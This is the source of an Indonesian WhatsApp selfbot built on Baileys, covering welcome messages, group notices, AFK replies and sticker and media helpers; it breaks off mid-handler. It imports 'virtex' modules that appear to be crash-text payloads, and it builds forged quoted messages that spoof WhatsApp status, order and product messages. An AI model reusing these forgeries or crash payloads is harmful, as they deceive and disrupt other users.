const {
    WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	relayWAMessage,
	mentionedJid,
	processTime,
	Browsers,
} = require('@adiwajshing/baileys')
const fs = require('fs')
const axios = require("axios")
const speed = require('performance-now')
const request = require('request')
const imgbb = require('imgbb-uploader')
const toMs = require('ms')
const ms = require('parse-ms')
const os = require('os');
const util = require('util');
const moment = require('moment-timezone')
const fetch = require('node-fetch')
const gtts = require('./lib/gtts.js')('id')
const phoneNum = require('awesome-phonenumber')
const ffmpeg = require('fluent-ffmpeg')
const imageToBase64 = require('image-to-base64')
const lolis = require('lolis.life')
const crypto = require('crypto')
const yts = require( 'yt-search')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const loli = new lolis()
const Exif = require('./lib/exif');
const exif = new Exif();
const { EmojiAPI } = require("emoji-api");
const { validmove, setGame } = require("./lib/tictactoe");
hit_today = [1000]

//********** FUNCTIONS **********//
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { color, bgcolor } = require('./lib/color')
const { help } = require('./src/help')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson, fetchText } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { exec } = require('child_process')
const { uploadimg } = require('./lib/uploadimg')


//********** DATABASE **********//
let _scommand = JSON.parse(fs.readFileSync('./src/scommand.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const autosticker = JSON.parse(fs.readFileSync('./src/autosticker.json'))
let settings = JSON.parse(fs.readFileSync('./settings.json'))
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { vapi } = require('./virtex/vapi')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')

const sleepp = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

//*********** CUSTOMABLE ***********//
//prefix = ""
f = '_'
blocked = []
fake = settings.fake
fakeimage = fs.readFileSync(`./media/fakenya.jpeg`)
numbernye = '0'
join = '\`\`\`New Member\`\`\` \n \`\`\`Nama :\`\`\` \n \`\`\`Askot : \`\`\` \n \`\`\`Umur :\`\`\` \n \`\`\`Status :\`\`\` \n\n - [ 𝙎𝙀𝙇𝙁 𝘽𝙊𝙏 ] -'
leave = '\`\`\`Sayonaraa👋\`\`\`'
promote = '*Your Welcome*'
demote = '*Lah kok iso?*'
targetpc = settings.targetpc
owner = settings.owner
ow = settings.ow
// NAMA BOT UBAH : CARI KATAKUNCI : Z A M  B O T 
numbernye = '0'
cmd_stc_mnu = '13572'
waktu = '-'
alasan = '-'
shp = `❏`
offline = false
public = false
const X = "❌"
const O = "⭕️"
const tunjuk = "👈"
const gaya = '```'
const imG = fs.readFileSync('./media/logo.jpeg')

//*********** VCARD  ***********//
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + 'FN:NIZAM STORE\n'
            + 'ORG:ZAM BOT;\n'
            + 'TEL;type=CELL;type=VOICE;waid= 994404819287:+994404819287\n'
            + 'END:VCARD'
            

//*********** 𝗔𝗣𝗜𝗞𝗘𝗬 ***********//


LolKey = settings.LolKey

function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
function tanggal(){
myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
			myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum at','Sabtu'];
			var tgl = new Date();
			var day = tgl.getDate()
			bulan = tgl.getMonth()
			var thisDay = tgl.getDay(),
			thisDay = myDays[thisDay];
			var yy = tgl.getYear()
			var year = (yy < 1000) ? yy + 1900 : yy;
			return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

function monospace(string) {
return '```' + string + '```'
}


async function starts() {
	const Repor = new WAConnection()
	Repor.version = [2,2119,6]
	Repor.logger.level = 'warn'
	console.log(banner.string)
	Repor.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan QR code nya Cok >_<'))
	})

	fs.existsSync('./session.json') && Repor.loadAuthInfo('./session.json')
	Repor.on('connecting', () => {
		start('2', 'Sedang Connect Bro :v')
	})
	Repor.on('open', () => {
		success('2', 'NICE INGFO SUDAH CONNECT🗿🤙')
	})
	await Repor.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./session.json', JSON.stringify(Repor.base64EncodedAuthInfo(), null, '\t'))



Repor.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			mem = anu.participants[0]
            try {
                var pp_user = await Repor.getProfilePicture(mem)
            } catch (e) {
                var pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            if (anu.action == 'add') {
            	num = anu.participants[0]
                anu_user = Repor.contacts[mem]
                anu_img = await getBuffer(`https://hardianto-chan.herokuapp.com/api/welcome4?profile=${pp_user}&name=${anu_user.notify}`)
                group_info = await Repor.groupMetadata(anu.jid)
                welkam = `┌──────────────────╮
│ *Welcome @${num.split('@')[0]} intro*                            
├─ ❏ Nama : 
├─ ❏ Umur :
├─ ❏ Askot :
├─ ❏ Cewe/Cowo?
└───────────────────╯

Kalau Sudah Ketik #menu Ya Kack😎`
                Repor.sendMessage(anu.jid, anu_img, MessageType.image, { caption: welkam })
            }
            if (anu.action == 'remove') {
            	num = anu.participants[0]
                anu_user = Repor.contacts[mem]
                group_info = await Repor.groupMetadata(anu.jid)
                anu_img = await getBuffer(`https://hardianto-chan.herokuapp.com/api/tools/leave?nama=${anu_user.norify}&namaGb=YNTKTS&pepeGb=${pp_user}&totalMem=${anu_user.length}&pepeUser=${pp_user}&bege=${pp_user}&apikey=hardianto`)
                out = `*Si Konsol @${num.split('@')[0]}* Keluar, Jan Balik Lagi Tod`
                Repor.sendMessage(anu.jid, anu_img, MessageType.image, { caption: out })
            }
} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})

Repor.on('group-update', async (anu) => {
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'</ Nizam >⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Nizam Store;;;\nFN:Creator Bot\nitem1.TEL;waid=994404819287:+994404819287\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
metdata = await Repor.groupMetadata(anu.jid)
if(anu.announce == 'false'){
teks = ` [ Group Opened ] \n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
Repor.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Opened ] - In ${metdata.subject}`)
}
else if(anu.announce == 'true'){
teks = ` [ Group Closed ] \n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
Repor.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Group Closed ]  In ${metdata.subject}`)
}
else if(!anu.desc == ''){
tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
teks = ` [ Group Description Change ] \n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
Repor.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'false'){
teks = ` [ Group Setting Change ] \n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
Repor.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'true'){
teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
Repor.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
}
})

function nocache(module, cb = () => { }) {
//console.log(color('========================================'))
//console.log('Module', `'${module}'`, 'is now being watched for changes')
fs.watchFile(require.resolve(module), async () => {
await uncache(require.resolve(module))
cb(module)
})
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
 
function uncache(module = '.') {
return new Promise((resolve, reject) => {
try {
delete require.cache[require.resolve(module)]
resolve()
} catch (e) {
reject(e)
}
})
}

require('./run.js')
nocache('./run.js', module => console.log(color(`Index.js is now updated!`)))
require('./src/help.js')
nocache('./src/help.js', module => console.log(color(`Menu.js is Now updated!`)))


	// CALL = BLOCK
Repor.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log("call dari "+ callerId)
        Repor.sendMessage(callerId, "    ", MessageType.text)
        await sleepp(4000)
})
	Repor.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})


	
	Repor.on('chat-update', async (revz) => {
		try {
            if (!revz.hasNewMessage) return
            revz = revz.messages.all()[0]
			if (!revz.message) return
			if (revz.key && revz.key.remoteJid == 'status@broadcast') return
	//		if (!isOwner && !revz.key.fromMe) return
	revz.message = (Object.keys(revz.message)[0] === 'ephemeralMessage') ? revz.message.ephemeralMessage.message : revz.message
		global.prefix
			global.blocked
			const content = JSON.stringify(revz.message)
			const from = revz.key.remoteJid
			const type = Object.keys(revz.message)[0]
			const apiKey = setting.apiKey 
			const cmd = (type === 'conversation' && revz.message.conversation) ? revz.message.conversation : (type == 'imageMessage') && revz.message.imageMessage.caption ? revz.message.imageMessage.caption : (type == 'videoMessage') && revz.message.videoMessage.caption ? revz.message.videoMessage.caption : (type == 'extendedTextMessage') && revz.message.extendedTextMessage.text ? revz.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
        button = (type == 'buttonsResponseMessage') ? revz.message.buttonsResponseMessage.selectedDisplayText : ''
        isImage = (type === 'imageMessage')
        listmes = (type == 'listResponseMessage') ? revz.message.listResponseMessage.title : ''
			const { text, extendedText, contact, caption, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const date = new Date().toLocaleDateString()
			const jam = moment.tz('Asia/Jakarta').format('HH:mm')
      const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
      const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
        
			body = (type === 'conversation' && revz.message.conversation.startsWith(prefix)) ? revz.message.conversation : (type == 'imageMessage') && revz.message.imageMessage.caption.startsWith(prefix) ? revz.message.imageMessage.caption : (type == 'videoMessage') && revz.message.videoMessage.caption.startsWith(prefix) ? revz.message.videoMessage.caption : (type == 'extendedTextMessage') && revz.message.extendedTextMessage.text.startsWith(prefix) ? revz.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? revz.message.conversation : (type === 'extendedTextMessage') ? revz.message.extendedTextMessage.text : ''
			const command = body.trim().split(/ +/).shift().toLowerCase()
				hit_today.push(command)
				const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			chats = (type === 'conversation') ? revz.message.conversation : (type === 'extendedTextMessage') ? revz.message.extendedTextMessage.text : ''
		const arg = chats.slice(command.length + 2, chats.length)
    const argss = body.split(/ +/g)
    
			Repor.updatePresence(from, Presence.recording)

			mess = {
				wait: '⌛ Sedang di Prosess ⌛',
				success: '✔️ Berhasil ✔️',
				error: {
					stick: '❌ Gagal, terjadi kesalahan saat mengkonversi gambar ke sticker ❌',
					Iv: '❌ Link tidak valid ❌'
				},
				only: {
					group: '❌ Perintah ini hanya bisa di gunakan dalam group! ❌',
					ownerG: '❌ Perintah ini hanya bisa di gunakan oleh owner group! ❌',
					ownerB: '❌ Perintah ini hanya bisa di gunakan oleh owner bot! ❌',
					admin: '❌ Perintah ini hanya bisa di gunakan oleh admin group! ❌',
					Badmin: ' ADMININ GW NGENTOD'
				}
			}
      const totalchat = await Repor.chats.all()
      const ownerNumber = ["62856432604388@s.whatsapp.net", "994404819287@s.whatsapp.net"]
			const botNumber = Repor.user.jid
			const isGroup = from.endsWith('@g.us')
			const sender = isGroup ? revz.participant : revz.key.remoteJid
			
			let senderr = revz.key.fromMe ? Repor.user.jid : revz.key.remoteJid.endsWith('@g.us') ? revz.participant : revz.key.remoteJid
			pushname = Repor.contacts[senderr] != undefined ? Repor.contacts[senderr].vname || Repor.contacts[senderr].notify : undefined
			const groupMetadata = isGroup ? await Repor.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const itsMe = sender == botNumber ? true : false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
		    const isAntiLink = isGroup ? antilink.includes(from) : false
			const isfilter = isGroup ? sfilter.includes(from) : false
			const isAuto = isGroup ? autosticker.includes(from) : false
			var pes = (type === 'conversation' && revz.message.conversation) ? revz.message.conversation : (type == 'imageMessage') && revz.message.imageMessage.caption ? revz.message.imageMessage.caption : (type == 'videoMessage') && revz.message.videoMessage.caption ? revz.message.videoMessage.caption : (type == 'extendedTextMessage') && revz.message.extendedTextMessage.text ? revz.message.extendedTextMessage.text : ''
			const messagesCC = pes.slice(0).trim().split(/ +/).shift()
			const mentionByTag = type == "extendedTextMessage" && revz.message.extendedTextMessage.contextInfo != null ? revz.message.extendedTextMessage.contextInfo.mentionedJid : []
	        const mentionByReply = type == "extendedTextMessage" && revz.message.extendedTextMessage.contextInfo != null ? revz.message.extendedTextMessage.contextInfo.participant || "" : ""
	       const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
	       mention != undefined ? mention.push(mentionByReply) : []
	       const mentionUser = mention != undefined ? mention.filter(n => n) : []
	       const senderNumber = sender.split("@")[0]
	       Repor.updatePresence(from, Presence.available) 
			const isOwner = ownerNumber.includes(sender)
			resbutton = (type == 'listResponseMessage') ? revz.message.listResponseMessage.selectedDisplayText : ''
			selectedButton = (type == 'buttonsResponseMessage') ? revz.message.buttonsResponseMessage.selectedButtonId : ''

			const totalhit = JSON.parse(fs.readFileSync('./lib/totalcmd.json'))[0].totalcmd
			const q = args.join(' ')
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
        
			const reply = (teks) => {
				Repor.sendMessage(from, teks, text, {quoted:revz})
			}
			const reply2 = (teks) => {
				Repor.sendMessage(from, teks, text, {quoted : revz,thumbnail : fakeimage})
			}
			const sendMess = (hehe, teks) => {
				Repor.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? Repor.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : Repor.sendMessage(from, teks.trim(), extendedText, {quoted: revz, contextInfo: {"mentionedJid": memberr}})
			}

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      Repor.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./src/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}


const fdocu = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/fakenya.jpeg')}}}
            
const fgrup = (teks) => {
            Repor.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
                    },
                    message: {
                        "locationMessage": {
                            //"mimetype": "image/jpeg",
                            "name": fake,
                            "jpegThumbnail": fs.readFileSync('./media/fakenya.jpeg')
                        }
                    }
                }
            })
        }
        const tys = {key: {remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 69, status: 200, thumbnail: fs.readFileSync('./media/fakenya.jpeg'), surface: 200, message: `${fake}`, orderTitle: 'Repor', sellerJid: '0@s.whatsapp.net'} } } 
const tysss = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./media/fakenya.jpeg`)
					},
					"title": fake,
					"description": "Z A M  B O T",
					"currencyCode": "USD",
					"priceAmount1000": "50000000",
					"retailerId": "Self Bot",
					"productImageCount": 999999
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}

const fakestatus = (teks) => {
            Repor.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./media/fakenya.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        
        const fvideo = {
	 key: { 
	      participant: '6285284001309@s.whatsapp.net'
	       },
	 message: { 
                 "videoMessage": { 
                 "title":"hallo bang",
                 "h": `Hmm`, 
                 'seconds': '9999999999', 
                 'caption': 'Haiii ',
                 'jpegThumbnail': fs.readFileSync('./media/fakenya.jpeg')
                        }
                       }
	                  }
	                  
                    const floc2 = {
	key:{
	 "fromMe": false,
	 "participant": `0@s.whatsapp.net`, 
	 "remoteJid": "6289530863358-1621036495@g.us" },
      message: { 
	  "liveLocationMessage": { 
		"name": '*Z A M  B O T*',  
	  "title":`fake`,
	"jpegThumbnail": fs.readFileSync('./media/fakenya.jpeg'),
	}
	}
}

const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./media/fakenya.jpeg`)
					},
					"title": fake,
					"description": "SELFBOT",
					"currencyCode": "USD",
					"priceAmount1000": "25000000000",
					"retailerId": "HII WIBU",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}

const troli = {
	                  key : {
                          participant : '0@s.whatsapp.net'
                            },
                    message: {
                    orderMessage: {
                            itemCount : 9999999999,
                            status: 1,
                            surface : 1,
                            message: 'Z A M  B O T', //Kasih namalu
                            orderTitle: 'Yahaha Ngebot',
                            thumbnail: fs.readFileSync('./media/fakenya.jpeg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net'
          
                             }
                           }
                         }
                         
                         const tag = {
	                  key : {
                          participant : '0@s.whatsapp.net'
                            },
                    message: {
                    orderMessage: {
                            itemCount : 9999999999,
                            status: 1,
                            surface : 1,
                            message: 'Yahaha Kena Tag :v', //Kasih namalu
                            orderTitle: 'Pesan Dari WhatsApp.',
                            thumbnail: fs.readFileSync('./media/fakenya.jpeg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net'
          
                             }
                           }
                         }
                         
                         const fakevn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "999",
                 "ptt": "true"
                        }
	                  } 
                     } 

          // Ucapan
          const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam🌚'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang🌇'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore🌝'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang🌝'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi🌝'
                                         }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam🌚'
                                         }
        //***** FILTER *****//
         if(isGroup && isfilter){
         if(revz.message.stickerMessage) return
         for(let i=0; i<filter.length; i++){
         if(messagesCC.includes(filter[i].Filter)){
         console.log(filter[i].Jawaban)
         reply2(filter[i].Jawaban)
      }}}
            //FUNCTION
            cekafk(afk)
            if (!revz.key.remoteJid.endsWith('@g.us') && offline){
            if (!isOwner && !revz.key.fromMe){
            if (isAfk(revz.key.remoteJid)) return
            addafk(revz.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            Repor.sendMessage(revz.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./media/fakenya.jpeg')}}}})
            }
            }   
        if (revz.key.remoteJid.endsWith('@g.us') && offline) {
        if (!isOwner && !revz.key.fromMe){
        if (revz.message.extendedTextMessage != undefined){
        if (revz.message.extendedTextMessage.contextInfo != undefined){
        if (revz.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of revz.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(revz.key.remoteJid)) return
        addafk(revz.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        Repor.sendMessage(revz.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./media/fakenya.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    const sendWebp = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
                    fs.unlinkSync(filess)
                    if (err) return reply(`${err}`)
                    exec(`webpmux -set exif ./stik/data.exif ${asw} -o ${asw}`, async (error) => {
                    if (error) return reply(`${error}`)
                    Repor.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:revz})
                    fs.unlinkSync(asw)
                    });
                });
                });
            }
            const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Repor.sendMessage(to, media, type, {sendEphemeral: true, quoted: revz, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            const sendFileFromUrl = async(link, type, options) => {
  hasil = await getBuffer(link)
	Repor.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	Repor.sendMessage(from, hasil, type, options).catch(e => {
	Repor.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	  console.log(e)
	})
	})
	})
	})
	}
const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Repor.sendMessage(to, media, MessageType.sticker,{quoted:revz})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            
            
          if (resbutton == 'ML 11 DIAMONDS(+1 BONUS)') {
